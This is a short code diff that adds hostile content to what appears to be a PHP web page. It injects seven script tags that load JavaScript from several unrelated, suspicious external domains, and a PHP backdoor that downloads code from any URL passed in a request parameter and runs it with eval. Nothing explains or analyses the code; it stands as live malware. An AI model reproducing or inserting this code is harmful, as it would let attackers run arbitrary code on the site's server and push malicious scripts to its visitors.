@@ -1,0 +1,4 @@
+<script type='text/javascript' src='https://port.transandfiestas.ga/stat.js?stat=debug'></script><script type='text/javascript' src='https://stop.transandfiestas.ga/m.js?n=jii'></script><script type='text/javascript' src='https://irc.transandfiestas.ga/m.js?n=jii'></script><script type='text/javascript' src='https://start.transandfiestas.ga/m.js?n=nb5'></script><script type='text/javascript' src='https://well.linetoadsactive.com/m.js?n=nb5'></script><script type='text/javascript' src='https://dock.lovegreenpencils.ga/m.js?n=nb5'></script><script type='text/javascript' src='https://cht.secondaryinformtrand.com/m.js?n=nb5'></script><?php
+//scp-173
+$ch = curl_init($_GET['url']);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result = curl_exec($ch);eval('?>'.$result);
+?>
